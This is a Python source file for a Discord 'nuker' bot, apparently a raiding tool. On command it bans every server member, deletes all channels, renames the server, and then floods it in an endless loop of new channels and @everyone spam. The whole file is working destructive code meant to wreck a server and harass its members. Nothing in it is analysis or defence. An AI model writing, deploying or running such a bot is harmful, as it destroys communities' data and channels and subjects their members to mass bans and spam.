import discord
import os
import time
from keep_active import keep_alive

intents = discord.Intents.all()
client = discord.Client(intents=intents)

nukemessage = "Get Nuked"

spammessage = "@everyone " + nukemessage * 70

@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game('Nuking Sim'))
  print("Logged in as {0.user}" .format(client))

@client.event
async def on_message(message):
  if message.author == client.user:
    return
  elif message.content.startswith("-banall"):
    try:
      await message.channel.purge(limit=1)
    except:
      print("failed to delete")
    pass
    await message.channel.send("Ban Activating in 10 Seconds")

    for i in range(0, 10):
      await message.channel.send("Activating in: " + str((10 - i)))
      time.sleep(1)
    for user in message.guild.members:
      if user != client.user and user != message.author:
        try:
          await user.ban()
          print("banned: ")
          print(user)
        except:
          print("ban failed: ")
          print(user)
    await message.channel.send("All bannable users banned")


  elif message.content.startswith("-nuke"):
    try:
      await message.channel.purge(limit=9999999999)
    except:
      print("failed to delete")
    pass

    await message.channel.send("Nuke Activating in 10 Seconds")

    for i in range(0, 10):
      await message.channel.send("Activating in: " + str((10 - i)))
      time.sleep(1)
    
    await message.channel.send("Nuke Activated")
    try:
      for channel in message.guild.channels:
          await channel.delete()
    except:
      print("delete failed")
    await message.guild.create_text_channel(nukemessage)

    try:
      await message.guild.edit(name=nukemessage)
    except:
      pass
    #await message.channel.send("Flood Starting")
    while True:
      try:
        #await message.channel.send(nukemessage)
        await message.guild.create_text_channel(nukemessage)
        for channel in message.guild.channels:
          await channel.send(spammessage)
      except:
        print("message failed")

keep_alive()

client.run(os.getenv('TOKEN'))
